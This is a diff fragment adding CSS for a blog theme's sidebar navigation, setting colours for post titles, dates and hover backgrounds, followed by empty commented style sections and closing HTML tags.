+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
